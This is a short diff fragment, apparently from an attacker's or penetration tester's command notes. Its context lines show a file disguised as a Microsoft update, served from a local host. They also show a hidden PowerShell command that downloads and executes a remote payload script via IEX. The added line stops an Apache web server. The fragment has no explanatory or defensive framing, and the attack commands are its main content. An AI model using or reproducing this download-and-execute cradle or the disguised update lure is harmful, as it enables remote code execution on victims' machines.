@@ -24,5 +24,7 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"
 
 
+sudo systemctl stop apache2
+
 
  
